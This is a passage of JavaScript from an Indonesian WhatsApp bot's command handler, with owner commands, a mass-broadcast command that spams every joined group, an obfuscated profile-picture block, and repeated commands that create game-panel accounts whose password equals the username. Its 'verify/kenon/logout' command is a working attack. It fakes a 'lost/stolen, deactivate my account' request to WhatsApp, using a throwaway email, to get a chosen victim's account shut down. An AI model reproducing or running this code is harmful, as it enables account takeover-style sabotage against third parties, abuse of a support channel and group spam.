            }
        break
        
        case 'react': {
                if (!isCreator) return newReply(mess.owner)
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                conn.sendMessage(m.chat, reactionMessage)
            }
        break
        case 'shutdown': {
             if (!isCreator) return newReply(mess.owner)
			 newReply(`Otsukaresama deshita🖐`)
             await sleep(3000)
             process.exit()
             }
        break
        
case 'verify':
case 'kenon':
case 'logout': {
if (!isCreator) return newReply('🤨 Mau Ngapain Lu?')
if (m.quoted || q) {
const froms = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')
var cekno = await conn.onWhatsApp(froms)
if (cekno.length == 0) return newReply(`Peserta tersebut sudah tidak terdaftar di WhatsApp`)
var targetnya = froms.split('@')[0]
try {
var axioss = require('axios')
var ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
var email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
var cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
var $ = cheerio.load(ntah.data)
var $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
var form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

var res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
var payload = String(res.data)
if (payload.includes(`"payload":true`)) {
newReply(`Succes, No ${targetnya} Telah logout`)
} else if (payload.includes(`"payload":false`)) {
newReply(`Hai ${pushname} Saat Ini Belum Dapat Melogout kan Mohon Untuk Menunggu Beberapa Saat`)
} else newReply(util.format(res.data))
} catch (err) {newReply(`${err}`)}
} else newReply('Masukkan nomor target!')
}
break

case 'pushmember': case 'jpm': {
if (!isCreator) return newReply(mess.owner)
if (!text) return newReply(`Teksnya Mana Banh?`)
let getGroups = await conn.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let piw = groups.map(v => v.id)
newReply(`‼️ *Sedang ${command} Ke ${piw.length} Group* , *Mohon Bersabar Jpm Ini Delay 2 Detik/Share*`)
for (let i of piw) {
await sleep(2000)
let txt = `${text}`
conn.sendMessage(i, {text: txt})
}
newReply(`🌟 *Sukses ${command} Ke ${piw.length} Group*`)
}
break

        case 'join': {
                if (!isCreator) return newReply(mess.owner)
                if (!text) return 'Masukkan Link Group!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return 'Link Invalid!'
                newReply(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await conn.groupAcceptInvite(result).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
        }
        break
        
        case 'leave': {
                if (!isCreator) return newReply(mess.owner)
                await conn.groupLeave(m.chat).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
        }
        break
        
        case 'setexif': {
                if (!isCreator) return newReply(mess.owner)
                if (!text) return newReply(`Contoh : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                newReply(`Exif berhasil diubah menjadi\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
        }
        break
        
        case 'setpp':
        case 'setpp':
        case 'setppbot': {
            function _0x1d19(){var _0x2bf2ef=['4259820vXkaKE','Sukses','89480afqcnZ','w:profile:picture','14DnKvaS','query','557985WFRGrv','856CAraQC','success','downloadAndSaveMediaMessage','test','5UCtsZI','Kirim/Reply\x20Image\x20Dengan\x20Caption\x20','set','unlinkSync','owner','22363110hLRSWH','1954998hCwgXG','picture','image','13034PkdVqU','updateProfilePicture','full','8PPEhfy','ppbot.jpeg','702420tyMrpN'];_0x1d19=function(){return _0x2bf2ef;};return _0x1d19();}var _0x2d2a75=_0x31ee;(function(_0x5beddb,_0x17a0e1){var _0x80bc9d=_0x31ee,_0x3970a4=_0x5beddb();while(!![]){try{var _0x4da0e6=parseInt(_0x80bc9d(0x1ff))/0x1*(-parseInt(_0x80bc9d(0x201))/0x2)+-parseInt(_0x80bc9d(0x1e9))/0x3*(parseInt(_0x80bc9d(0x1fa))/0x4)+-parseInt(_0x80bc9d(0x1ee))/0x5*(parseInt(_0x80bc9d(0x1fd))/0x6)+-parseInt(_0x80bc9d(0x1f7))/0x7*(parseInt(_0x80bc9d(0x1ea))/0x8)+parseInt(_0x80bc9d(0x1f4))/0x9+parseInt(_0x80bc9d(0x1fc))/0xa+parseInt(_0x80bc9d(0x1f3))/0xb;if(_0x4da0e6===_0x17a0e1)break;else _0x3970a4['push'](_0x3970a4['shift']());}catch(_0x322f7a){_0x3970a4['push'](_0x3970a4['shift']());}}}(_0x1d19,0x64cf8));if(!isCreator)return newReply(mess[_0x2d2a75(0x1f2)]);function _0x31ee(_0x4a5085,_0x23d021){var _0x1d199d=_0x1d19();return _0x31ee=function(_0x31ee4c,_0xf0e768){_0x31ee4c=_0x31ee4c-0x1e8;var _0x46be36=_0x1d199d[_0x31ee4c];return _0x46be36;},_0x31ee(_0x4a5085,_0x23d021);}if(!quoted)return newReply(_0x2d2a75(0x1ef)+(prefix+command));if(!/image/[_0x2d2a75(0x1ed)](mime))return newReply(_0x2d2a75(0x1ef)+(prefix+command));if(/webp/[_0x2d2a75(0x1ed)](mime))return newReply(_0x2d2a75(0x1ef)+(prefix+command));var medis=await conn[_0x2d2a75(0x1ec)](quoted,_0x2d2a75(0x1fb));if(args[0x0]==_0x2d2a75(0x1f9)){var {img}=await generateProfilePicture(medis);await conn[_0x2d2a75(0x1e8)]({'tag':'iq','attrs':{'to':botNumber,'type':_0x2d2a75(0x1f0),'xmlns':_0x2d2a75(0x200)},'content':[{'tag':_0x2d2a75(0x1f5),'attrs':{'type':_0x2d2a75(0x1f6)},'content':img}]}),fs[_0x2d2a75(0x1f1)](medis),newReply(mess[_0x2d2a75(0x1eb)]);}else{var memeg=await conn[_0x2d2a75(0x1f8)](botNumber,{'url':medis});fs[_0x2d2a75(0x1f1)](medis),newReply(_0x2d2a75(0x1fe));}
            }
        break
case "1gb": {
    if (!isPremium) return newReply(mess.prem)

let t = text.split(',');
if (t.length < 2) return newReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "1000"
let cpu = "35"
let disk = "0"
let email = username + "@nobita404.io"
akunlo = "https://i.top4top.io/p_2724da80p0.jpg" 
if (!u) return
let d = (await conn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta
}
})
newReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}
<-----INI ADALAH DATA AKUN MU----->

╭─❏ *『 USER INFO 』*
┣❏ ➤[USER ID: ${user.id}]
┣❏ ➤👤USERNAME: ${user.username}
┣❏ ➤🔐PASSWORD: ${password}
┣❏ ➤🌐LOGIN: ${domain}
┗⬣
© NobitaOfc
`
conn.sendMessage(u, {
    text: ctf,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BUATAN BOT",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await newReply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
USERNAME: ${user.username}
EMAIL: ${user.email}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "2gb": {
    if (!isPremium) return newReply(mess.prem)

let t = text.split(',');
if (t.length < 2) return newReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "2000"
let cpu = "55"
let disk = "0"
let email = username + "@nobita404.io"
akunlo = "https://i.top4top.io/p_2724da80p0.jpg" 
if (!u) return
let d = (await conn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta
}
})
newReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}
<-----INI ADALAH DATA AKUN MU----->

╭─❏ *『 USER INFO 』*
┣❏ ➤[USER ID: ${user.id}]
┣❏ ➤👤USERNAME: ${user.username}
┣❏ ➤🔐PASSWORD: ${password}
┣❏ ➤🌐LOGIN: ${domain}
┗⬣
© NobitaOfc
`
conn.sendMessage(u, {
    text: ctf,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BUATAN BOT",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await newReply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
USERNAME: ${user.username}
EMAIL: ${user.email}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "3gb": {
    if (!isPremium) return newReply(mess.prem)

let t = text.split(',');
if (t.length < 2) return newReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "3000"
let cpu = "75"
let disk = "0"
let email = username + "@nobita404.io"
akunlo = "https://i.top4top.io/p_2724da80p0.jpg" 
if (!u) return
let d = (await conn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta
}
})
newReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}
<-----INI ADALAH DATA AKUN MU----->

╭─❏ *『 USER INFO 』*
┣❏ ➤[USER ID: ${user.id}]
┣❏ ➤👤USERNAME: ${user.username}
┣❏ ➤🔐PASSWORD: ${password}
┣❏ ➤🌐LOGIN: ${domain}
┗⬣
© NobitaOfc
`
conn.sendMessage(u, {
    text: ctf,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BUATAN BOT",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await newReply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
USERNAME: ${user.username}
EMAIL: ${user.email}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "4gb": {
    if (!isPremium) return newReply(mess.prem)

let t = text.split(',');
if (t.length < 2) return newReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "4000"
let cpu = "100"
let disk = "0"
let email = username + "@nobita404.io"
akunlo = "https://i.top4top.io/p_2724da80p0.jpg" 
if (!u) return
let d = (await conn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta
}
})
newReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}
<-----INI ADALAH DATA AKUN MU----->

╭─❏ *『 USER INFO 』*
┣❏ ➤[USER ID: ${user.id}]
┣❏ ➤👤USERNAME: ${user.username}
┣❏ ➤🔐PASSWORD: ${password}
┣❏ ➤🌐LOGIN: ${domain}
┗⬣
© NobitaOfc
`
conn.sendMessage(u, {
    text: ctf,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BUATAN BOT",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await newReply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
USERNAME: ${user.username}
EMAIL: ${user.email}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "5gb": {
    if (!isPremium) return newReply(mess.prem)
let t = text.split(',');
if (t.length < 2) return newReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "5000"
let cpu = "120"
let disk = "0"
let email = username + "@nobita404.io"
akunlo = "https://i.top4top.io/p_2724da80p0.jpg" 
if (!u) return
let d = (await conn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta
}
})
newReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}
<-----INI ADALAH DATA AKUN MU----->

╭─❏ *『 USER INFO 』*
┣❏ ➤[USER ID: ${user.id}]
┣❏ ➤👤USERNAME: ${user.username}
┣❏ ➤🔐PASSWORD: ${password}
┣❏ ➤🌐LOGIN: ${domain}
┗⬣
© NobitaOfc
`
conn.sendMessage(u, {
    text: ctf,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BUATAN BOT",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await newReply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
USERNAME: ${user.username}
EMAIL: ${user.email}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "6gb": {
    if (!isPremium) return newReply(mess.prem)

let t = text.split(',');
if (t.length < 2) return newReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "6000"
let cpu = "80"
let disk = "0"
let email = username + "@nobita404.io"
akunlo = "https://i.top4top.io/p_2724da80p0.jpg" 
if (!u) return
let d = (await conn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta
}
})
newReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}
<-----INI ADALAH DATA AKUN MU----->

╭─❏ *『 USER INFO 』*
┣❏ ➤[USER ID: ${user.id}]
┣❏ ➤👤USERNAME: ${user.username}
┣❏ ➤🔐PASSWORD: ${password}
┣❏ ➤🌐LOGIN: ${domain}
┗⬣
© NobitaOfc
`
conn.sendMessage(u, {
    text: ctf,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BUATAN BOT",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await newReply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
USERNAME: ${user.username}
EMAIL: ${user.email}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "7gb": {
    if (!isPremium) return newReply(mess.prem)

let t = text.split(',');
if (t.length < 2) return newReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "7000"
let cpu = "80"
let disk = "0"
let email = username + "@nobita404.io"
akunlo = "https://i.top4top.io/p_2724da80p0.jpg" 
if (!u) return
let d = (await conn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta
}
})
newReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}
<-----INI ADALAH DATA AKUN MU----->

╭─❏ *『 USER INFO 』*
┣❏ ➤[USER ID: ${user.id}]
┣❏ ➤👤USERNAME: ${user.username}
┣❏ ➤🔐PASSWORD: ${password}
┣❏ ➤🌐LOGIN: ${domain}
┗⬣
© NobitaOfc
`
conn.sendMessage(u, {
    text: ctf,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BUATAN BOT",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await newReply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
USERNAME: ${user.username}
EMAIL: ${user.email}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
